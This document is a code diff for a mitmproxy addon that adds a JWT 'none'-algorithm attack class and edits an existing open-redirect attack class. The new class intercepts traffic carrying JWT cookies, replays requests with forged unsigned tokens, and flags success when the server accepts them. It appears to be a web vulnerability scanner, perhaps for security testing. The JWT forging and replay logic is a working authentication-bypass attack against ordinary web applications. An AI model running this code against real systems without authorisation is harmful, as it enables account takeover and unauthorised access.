@@ -1,5 +1,7 @@
+import base64
+import json
 from mitmproxy import http
-from helpers import replay_flow, is_request_in_scope
+from helpers import *
 from constants import URL_REGEX_STRING, PATH_REGEX_STRING
 import re, tldextract, json, hashlib
 
@@ -26,6 +28,51 @@ class RequestLogger:
         print(flow.request.query)
         print(flow.request.path_components)
 
+class JWTNoneAlgAttack:
+    BENCHMARK_LABEL = 'JWT_NONE_ALG_BENCHMARK' # label for the benchmark failing flow
+    ATTACK_LABEL = 'JWT_NONE_ALG_ATTACK' # label for the attack flow
+
+    def request(self, flow: http.HTTPFlow):
+        if get_jwt(flow.request.cookies) is None:
+            return # No JWT token
+        
+        if flow.request.path.find('socket.io') != -1:
+            return # socket.io request
+        
+        if not hasattr(flow, 'label'):
+            benchmark_flow = flow.copy()
+            benchmark_flow.label = self.BENCHMARK_LABEL
+            benchmark_flow.request.headers.pop('Authorization', None)
+            benchmark_flow.request.cookies['token'] = generate_none_token_with_signature(get_jwt(flow.request.cookies))
+            replay_flow(benchmark_flow)
+
+
+    def response(self, flow: http.HTTPFlow):
+        if get_jwt(flow.request.cookies) is None:
+            return # No JWT token
+        
+        if flow.request.path.find('socket.io') != -1:
+            return # socket.io request
+
+        if not hasattr(flow, 'label'):
+            return # No label attribute (not a replayed request i.e. original request)
+        
+        if flow.label == self.BENCHMARK_LABEL:
+            attack_flow = flow.copy()
+            attack_flow.label = self.ATTACK_LABEL
+            attack_flow.benchmark_hash = hash(flow.response.text)
+            attack_flow.request.headers.pop('Authorization', None)
+            attack_flow.request.cookies['token'] = drop_token_signature(get_jwt(flow.request.cookies))
+            replay_flow(attack_flow)
+        elif flow.label == self.ATTACK_LABEL:    
+            if flow.benchmark_hash != hash(flow.response.text):
+                print('__' * 25)
+                print(self.ATTACK_LABEL, 'SUCCESS!!', flow.request.pretty_url)
+                print('__' * 25, '\n')
+            else:
+                pass # attack failed
+        else:
+            pass # not a replayed request
 
 class OpenRedirectionAttack:
     REF_ATTACK_URL = 'http://google.com'
@@ -55,7 +102,7 @@ class OpenRedirectionAttack:
             attack_flow.request.query[param_name] = self.REF_ATTACK_URL
             attack_flow.request.ignore = True
             # print(attack_flow.request.query)
-            replay_flow(attack_flow, self.ATTACK_LABEL)
+            replay_flow(attack_flow)
     
 
     def response(self, flow: http.HTTPFlow):
